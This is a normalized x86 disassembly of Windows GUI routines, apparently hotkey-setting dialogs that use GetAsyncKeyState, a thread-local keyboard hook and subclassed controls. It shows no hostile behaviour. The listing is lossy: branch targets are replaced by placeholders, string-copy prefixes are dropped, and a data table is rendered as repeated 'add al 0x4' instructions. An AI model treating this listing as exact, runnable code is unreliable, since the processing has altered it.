mov eax ebx
pop ebx
retn 0x10
push edx
mov edx [ esp + 0x1c ]
add edx edi
add edx esi
add eax edi
push edx
add eax ebp
push eax
call sub_4b5890
mov edx [ esp + 0x20 ]
add esp 0xc
mov eax [ eax ]
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
test ebp ebp
jne r-xdata
mov eax [ ebx + 0x14 ]
push eax
push ebp
mov ecx ebx
call sub_401240
mov edx [ esp + 0x14 ]
test ebp ebp
jbe r-xdata
cmp eax 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
cmp esi [ esp + 0x20 ]
jae r-xdata
pop ebp
lea eax [ ebx + 0x4 ]
pop edi
mov [ eax ] 0x0
pop esi
mov eax ebx
pop ebx
retn 0x10
mov eax [ ebx + 0x4 ]
pop ebp
pop edi
mov [ eax ] 0x0
pop esi
mov eax ebx
pop ebx
retn 0x10
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
mov eax [ ebx + 0x18 ]
cmp eax 0x10
lea eax [ ebx + 0x4 ]
jb r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov [ esp + 0x14 ] eax
mov ecx [ eax ]
mov [ esp + 0x14 ] ecx
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov [ eax + ebp ] 0x0
mov eax [ ebx + 0x4 ]
mov [ eax + ebp ] 0x0
pop ebp
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x10
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + 0x18 ] 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
push edx
mov edx [ esp + 0x18 ]
add edx edi
add edx esi
push edx
mov edx [ esp + 0x28 ]
add eax edi
add eax edx
push eax
call sub_4b5890
add esp 0xc
mov eax [ eax ]
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
sub_461950
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4606a0
lea edx [ esi + esi * 2 ]
add esp 0x14
lea eax [ edi + edx * 4 ]
pop edi
pop esi
retn 0xc
sub_461980
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4606e0
mov eax esi
imul eax eax 0xdc
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_4619b0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_460710
mov eax esi
imul eax eax 0x1a0
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_4619e0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_460740
add esp 0x14
lea eax [ edi + esi ]
pop edi
pop esi
retn 0xc
sub_461a10
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_460770
lea edx [ esi + esi * 4 ]
add esp 0x14
lea eax [ edi + edx * 4 ]
pop edi
pop esi
retn 0xc
sub_461a40
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_420d80
add esp 0x14
lea eax [ edi + esi * 4 ]
pop edi
pop esi
retn 0xc
sub_461a70
mov eax [ esp + 0xc ]
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi eax
mov ebp ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebp
retn 0xc
mov esi [ ebp + 0x8 ]
cmp eax esi
mov edx edi
je r-xdata
mov [ ebp + 0x8 ] edx
lea ebx [ ebx ]
mov cl [ eax ]
mov [ edx ] cl
inc edx
inc eax
cmp eax esi
jne r-xdata
sub_461ab0
push ebx
push esi
mov esi ecx
cmp [ esi + 0x7c ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x7c ] 0xf
mov [ esi + 0x78 ] ebx
mov [ esi + 0x68 ] bl
cmp [ esi + 0x28 ] 0x10
jb r-xdata
mov eax [ esi + 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] 0xf
mov [ esi + 0x14 ] bl
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_461b00
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
mov edx eax
add ecx 0x4
dec edx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov [ ecx ] eax
inc [ eax + 0xd48 ]
sub_461b30
push ebx
mov ebx [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp edi ebx
je r-xdata
pop edi
pop ebx
retn
push esi
nop
add edi 0x4
cmp edi ebx
jne r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_461b70
push esi
mov esi [ esp + 0x10 ]
mov eax esi
push edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ esp + 0xc ]
sub eax edi
push eax
mov eax [ esp + 0x14 ]
push esi
push eax
push edx
call sub_461770
pop edi
pop esi
retn 0xc
sub_461ba0
mov eax [ esp + 0xc ]
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn 0xc
mov esi [ ecx + 0x8 ]
cmp eax esi
mov edx edi
je r-xdata
mov [ ecx + 0x8 ] edx
mov ebx [ eax ]
mov [ edx ] ebx
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
add eax 0x8
add edx 0x8
cmp eax esi
jne r-xdata
sub_461be0
push ecx
mov eax [ esp + 0x10 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
cmp ebp eax
push esi
push edi
mov [ esp + 0x10 ] ecx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
pop ecx
retn 0xc
mov ebx [ ecx + 0x8 ]
cmp eax ebx
mov edx ebp
je r-xdata
mov [ ecx + 0x8 ] edx
mov edi edi
mov esi eax
mov edi edx
add eax 0x14
mov ecx 0x5
add edx 0x14
cmp eax ebx
[ edi ] [ esi ]
jne r-xdata
mov ecx [ esp + 0x10 ]
sub_461c30
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_4616d0
add esp 0x14
retn 0xc
sub_461c60
push 0xffffffff
push sub_4c0a2b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x11c
push ebx
push ebp
push esi
push edi
xor edi edi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
mov esi [ esp + 0x140 ]
cmp esi 0x104
mov ebp [ esp + 0x144 ]
mov ebx [ esp + 0x13c ]
mov [ esp + 0x134 ] edi
ja r-xdata
cmp esi 0x106
je r-xdata
je r-xdata
xor eax eax
cmp esi 0x204
je r-xdata
cmp ebp 0x12
je r-xdata
mov eax esi
sub eax 0x7
je r-xdata
mov esi [ esp + 0x13c ]
push esi
call [ GetDlgCtrlID@IAT ]
push r--data
push 0x0
push 0xc
push esi
mov [ eax * 4 + rw-data ] 0x0
call [ SendMessageA@IAT ]
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov ecx [ esp + 0x148 ]
mov edx [ rw-data ]
push ecx
push ebp
push esi
push ebx
push edx
call [ CallWindowProcA@IAT ]
mov esi eax
cmp [ esp + 0x28 ] 0x10
jb r-xdata
cmp ebp 0x10
je r-xdata
push 0xffffffff
push edi
push 0xb1
push ebx
call [ PostMessageA@IAT ]
jmp r-xdata
sub eax 0xf9
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax esi
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp ebp 0x11
je r-xdata
sub eax 0x2
jne r-xdata
mov ecx [ esp + 0x12c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x128
retn 0x10
mov esi [ GetAsyncKeyState@IAT ]
push 0x12
call esi
test ah ah
jns r-xdata
lea ecx [ esp + 0x10 ]
call sub_4480e0
jmp r-xdata
push 0x11
call esi
test ah ah
jns r-xdata
mov eax [ esp + 0x24 ]
test eax eax
mov edi 0x400
jbe r-xdata
push 0x10
call esi
test ah ah
jns r-xdata
mov eax [ esp + 0x24 ]
or edi 0x200
test eax eax
jbe r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
mov eax [ esp + 0x24 ]
test eax eax
jbe r-xdata
mov eax [ esp + 0x24 ]
or edi 0x100
test eax eax
jbe r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
mov eax [ ebp * 4 + rw-data ]
push r--data
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
push r--data
lea ecx [ esp + 0x14 ]
call sub_402010
mov eax [ ebp * 4 + rw-data ]
push eax
push ebp
lea ecx [ esp + 0x30 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x2c ]
push edx
jmp r-xdata
mov edi [ SendMessageA@IAT ]
push eax
push 0x0
push 0xc
push esi
call edi
push 0x0
push 0x0
push 0x28
push esi
call [ GetParent@IAT ]
push eax
call edi
lea ecx [ esp + 0x10 ]
call sub_4480e0
jmp r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x14 ]
call sub_402010
mov esi [ esp + 0x13c ]
push esi
or edi ebp
call [ GetDlgCtrlID@IAT ]
mov [ eax * 4 + rw-data ] edi
cmp [ esp + 0x28 ] 0x10
mov eax [ esp + 0x14 ]
jae r-xdata
sub_461ef0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0a50
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push ebp
add eax 0xffffffb2
cmp eax 0xe5
push esi
push edi
ja r-xdata
xor eax eax
movzx eax [ eax + lookup_table_4625fc ]
jmp [ eax * 4 + jump_table_4625e8 ]
mov ecx [ esp + 0x5c ]
push ecx
call [ GetDlgCtrlID@IAT ]
cmp eax 0x1f4
jl r-xdata
mov esi [ esp + 0x50 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x31
push esi
call edi
mov ebx eax
lea eax [ esp + 0x14 ]
push eax
push esi
mov [ esp + 0x5c ] ebx
call [ GetClientRect@IAT ]
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push 0x0
push eax
push 0x1
push esi
add ecx 0xffffffe0
push ecx
push edx
push 0x0
push 0x0
push 0x54008400
push 0x0
push r--data
push 0x0
mov [ esp + 0x8c ] eax
call [ CreateWindowExA@IAT ]
push 0x1000a0
push 0x0
mov ebp eax
push 0x1329
push ebp
call edi
push 0x0
push ebx
push 0x30
push ebp
call edi
mov [ esp + 0x24 ] 0x1
xor esi esi
movzx eax [ esp + 0x58 ]
cmp eax 0x4
jg r-xdata
mov eax [ esp + 0x5c ]
mov ecx [ eax + 0x4 ]
dec ecx
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x29e
ja r-xdata
mov eax [ esi * 4 + rw-data ]
lea ecx [ esp + 0x24 ]
push ecx
push esi
push 0x1307
push ebp
mov [ esp + 0x40 ] eax
call edi
inc esi
cmp esi 0x5
jl r-xdata
mov edx [ rw-data ]
push 0x0
push edx
push 0x130c
push ebp
call edi
mov [ esp + 0x58 ] 0x1f4
xor ebp ebp
mov [ esp + 0x10 ] 0xab
jmp r-xdata
cmp eax 0x614
jne r-xdata
je r-xdata
cmp [ eax + 0x8 ] 0xfffffdd9
jne r-xdata
mov ecx [ esp + 0x40 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn 0x10
lea esi [ eax - 0x1f4 ]
mov edi [ esi * 4 + rw-data ]
xor ecx ecx
or edx 0xffffffff
xor eax eax
mov eax [ ebp + rw-data ]
mov ecx [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push 0x0
push ecx
lea edx [ ebx - 0x190 ]
push edx
mov [ ebp + rw-data ] eax
mov eax [ esp + 0x5c ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4000000b
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ esp + 0x54 ]
push 0x0
push ecx
mov esi eax
push 0x30
push esi
call edi
mov edx [ ebp + rw-data ]
push edx
push 0x0
push 0xc
push esi
call edi
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x50 ]
push 0x0
push eax
push ebx
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x40810000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov edx [ esp + 0x54 ]
xor esi esi
push esi
push edx
mov ebx eax
push 0x30
push ebx
call edi
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x48 ] esi
mov esi [ ebp + rw-data ]
test esi 0x400
je r-xdata
mov edi [ esp + 0x50 ]
mov ebp [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
xor esi esi
lea esp [ esp ]
mov ebp [ esp + 0x50 ]
xor edi edi
jmp r-xdata
dec eax
je r-xdata
mov edx [ eax ]
push 0x0
push 0x0
push 0x130b
push edx
call [ SendMessageA@IAT ]
push eax
mov [ rw-data ] eax
mov eax [ esp + 0x54 ]
push eax
call sub_459790
add esp 0x8
inc eax
cmp eax 0xab
jb r-xdata
cmp eax esi
je r-xdata
test esi 0x200
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
push r--data
push 0x0
push 0xc
lea ecx [ esi + 0x1f4 ]
push ecx
push edi
mov [ esi * 4 + rw-data ] 0x0
call ebp
push eax
call ebx
inc esi
cmp esi 0xab
jb r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ edi * 4 + rw-data ]
lea edx [ edi + 0x1f4 ]
push edx
push ebp
mov [ edi * 4 + rw-data ] ecx
call [ GetDlgItem@IAT ]
mov ebx eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov esi [ edi * 4 + rw-data ]
test esi 0x400
mov [ esp + 0x48 ] 0x1
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
cmp edi [ eax * 4 + rw-data ]
jne r-xdata
test edi edi
jne r-xdata
inc ecx
mov edx eax
test esi 0x100
je r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
test esi 0x200
je r-xdata
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
mov eax [ esp + 0x50 ]
push 0x1
push eax
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
push eax
call [ UnhookWindowsHookEx@IAT ]
mov eax [ rw-data ]
test eax eax
mov ecx 0xab
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
je r-xdata
test ecx ecx
jle r-xdata
mov edx [ esp + 0x58 ]
push 0xc8c8c8
push edx
call [ SetTextColor@IAT ]
mov eax 0x1
jmp r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
test esi 0x100
je r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
mov edx [ esp + 0x50 ]
push 0x2
push edx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
push eax
call [ UnhookWindowsHookEx@IAT ]
mov edx [ esp + 0x58 ]
push 0x0
push edx
call [ SetTextColor@IAT ]
mov [ esi * 4 + rw-data ] 0x0
mov eax 0x1
jmp r-xdata
cmp ecx 0x1
jne r-xdata
and esi 0xff
mov esi [ esi * 4 + rw-data ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jbe r-xdata
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
mov ecx [ esp + 0x58 ]
push 0xff
push ecx
call [ SetTextColor@IAT ]
mov [ esi * 4 + rw-data ] 0x1
mov eax 0x1
jmp r-xdata
mov eax [ edx * 4 + rw-data ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x2c ]
call sub_401cc0
cmp [ esp + 0x3c ] 0x10
mov eax [ esp + 0x28 ]
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x2c ]
call sub_401cc0
and esi 0xff
mov esi [ esi * 4 + rw-data ]
mov eax esi
lea edx [ eax + 0x1 ]
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
push r--data
lea ecx [ esp + 0x28 ]
call sub_402010
mov eax [ esp + 0x50 ]
push ecx
push 0x0
add edx 0x1f4
push edx
push eax
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
push eax
push 0x0
push 0xc
push ebx
call edi
push sub_461c60
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x48 ] 0xffffffff
jb r-xdata
lea eax [ esp + 0x28 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x2c ]
call sub_401cc0
cmp [ esp + 0x3c ] 0x10
mov eax [ esp + 0x28 ]
jae r-xdata
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x10 ]
inc edx
add ebp 0x4
dec eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x58 ] edx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x28 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push eax
push 0x0
push 0xc
push ebx
call [ SendMessageA@IAT ]
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x48 ] 0xffffffff
jb r-xdata
lea eax [ esp + 0x28 ]
mov ecx [ rw-data ]
mov esi [ esp + 0x50 ]
push ecx
push esi
call sub_459790
add esp 0x8
push 0x0
push esi
call [ GetWindowThreadProcessId@IAT ]
push eax
push 0x0
push sub_459710
push 0x2
call [ SetWindowsHookExA@IAT ]
mov [ rw-data ] eax
mov eax 0x1
jmp r-xdata
inc edi
cmp edi 0xab
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
jb r-xdata
mov eax [ esp + 0x28 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax 0x1
jmp r-xdata
sub_462601
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0a6b
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x158
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ rw-data ]
mov edi [ GetWindowRect@IAT ]
lea edx [ esp + 0x3c ]
push edx
push eax
call edi
mov esi [ esp + 0x178 ]
lea ecx [ esp + 0x2c ]
push ecx
push esi
call edi
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x30 ]
mov ebx [ esp + 0x48 ]
sub eax ecx
mov ecx [ esp + 0x40 ]
mov edi [ esp + 0x34 ]
mov ebp [ esp + 0x44 ]
sub eax ecx
add eax ebx
cdq
sub eax edx
sar eax 0x1
push 0x5
add eax ecx
mov ecx [ esp + 0x40 ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x3c ]
sub eax edi
sub eax ecx
add eax ebp
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov edx [ rw-data ]
mov edi [ wsprintfA@IAT ]
push edx
lea eax [ esp + 0x6c ]
push r--data
push eax
call edi
mov ebp [ SendDlgItemMessageA@IAT ]
add esp 0xc
lea ecx [ esp + 0x68 ]
push ecx
push 0x0
push 0xc
push 0x534
push esi
call ebp
cmp [ rw-data ] 0x2
mov [ rw-data ] 0x1
jge r-xdata
dec eax
je r-xdata
mov ebx [ rw-data ]
inc ebx
xor ebx ebx
jmp r-xdata
mov esi [ esp + 0x180 ]
cmp si 0x1
jne r-xdata
sub eax 0x3
jne r-xdata
mov ebx [ rw-data ]
inc ebx
xor ebx ebx
jmp r-xdata
push ebx
lea edx [ esp + 0x6c ]
push r--data
push edx
call edi
add esp 0xc
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0xc
push 0x535
push esi
call ebp
mov ecx [ rw-data ]
push 0x1
lea edx [ esp + 0x14 ]
push edx
push 0x2
push 0x536
push esi
mov [ esp + 0x24 ] 0x1c
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x30 ] ecx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x34 ] 0x1
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
cmp [ rw-data ] 0x2
jge r-xdata
cmp si 0x2
jne r-xdata
mov esi [ esp + 0x178 ]
mov edi [ SendDlgItemMessageA@IAT ]
lea ecx [ esp + 0x68 ]
push ecx
push 0x100
push 0xd
push 0x534
push esi
call edi
lea edx [ esp + 0x68 ]
push edx
call j_sub_4b692d
add esp 0x4
mov [ rw-data ] eax
lea eax [ esp + 0x68 ]
push eax
push 0x100
push 0xd
push 0x535
push esi
call edi
lea ecx [ esp + 0x68 ]
push ecx
call j_sub_4b692d
mov ecx [ rw-data ]
add esp 0x4
dec eax
cmp eax ecx
mov [ rw-data ] eax
jl r-xdata
xor eax eax
mov edi [ esp + 0x184 ]
lea eax [ esp + 0x10 ]
push eax
push 0x2
push edi
mov [ esp + 0x1c ] 0x1c
mov [ esp + 0x20 ] 0x7
call [ GetScrollInfo@IAT ]
mov ecx [ esp + 0x180 ]
movzx eax cx
cmp eax 0x7
mov [ esp + 0x14 ] 0x4
ja r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0x539
push esi
call edi
push ebx
lea eax [ esp + 0x6c ]
push r--data
push eax
call edi
add esp 0xc
lea ecx [ esp + 0x68 ]
push ecx
push 0x0
push 0xc
push 0x537
push esi
call ebp
push 0x1
lea edx [ esp + 0x14 ]
push edx
push 0x2
push 0x538
push esi
mov [ esp + 0x38 ] ebx
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
mov eax [ rw-data ]
test eax eax
mov edi [ CheckDlgButton@IAT ]
je r-xdata
cmp si 0x535
je r-xdata
mov ecx [ esp + 0x178 ]
push 0x2
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
lea edx [ esp + 0x68 ]
push edx
push 0x100
push 0xd
push 0x537
push esi
call edi
lea eax [ esp + 0x68 ]
push eax
call j_sub_4b692d
mov ecx [ rw-data ]
add esp 0x4
dec eax
cmp eax ecx
mov [ rw-data ] eax
jl r-xdata
dec ecx
mov [ rw-data ] ecx
push 0x1
lea edx [ esp + 0x14 ]
push edx
push 0x2
push edi
call [ SetScrollInfo@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_462cd0 ]
mov [ rw-data ] 0x0
push 0x1
push 0x53a
push esi
call edi
mov edx esi
shr edx 0x10
cmp edx 0x300
jne r-xdata
cmp si 0x537
jne r-xdata
mov ecx [ esp + 0x168 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x164
retn
mov edi [ rw-data ]
xor edx edx
cmp edi edx
jge r-xdata
lea eax [ ecx - 0x1 ]
mov [ rw-data ] eax
mov eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x6c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x184 ]
mov ebx [ GetDlgItem@IAT ]
add esp 0xc
push 0x536
push esi
call ebx
cmp edi eax
jne r-xdata
mov ecx [ esp + 0x18 ]
jmp r-xdata
mov edx [ esp + 0x1c ]
sub edx [ esp + 0x20 ]
inc edx
mov [ esp + 0x24 ] edx
jmp r-xdata
mov eax [ esp + 0x24 ]
cmp eax [ esp + 0x18 ]
jle r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
sub ecx esi
inc ecx
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
sub eax 0xa
cmp eax ecx
mov [ esp + 0x24 ] eax
jge r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
add ecx 0xa
sub eax esi
inc eax
cmp ecx eax
mov [ esp + 0x24 ] ecx
jle r-xdata
shr ecx 0x10
mov al [ rw-data ]
test al al
jne r-xdata
cmp eax edx
jge r-xdata
cmp eax edx
jge r-xdata
push 0x538
push esi
call ebx
cmp edi eax
jne r-xdata
lea edx [ esp + 0x68 ]
push edx
push 0x0
push 0xc
push 0x535
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov [ esp + 0x24 ] ecx
dec eax
mov [ esp + 0x24 ] eax
jmp r-xdata
inc eax
mov [ esp + 0x24 ] eax
jmp r-xdata
jmp r-xdata
mov [ esp + 0x24 ] eax
jmp r-xdata
xor eax eax
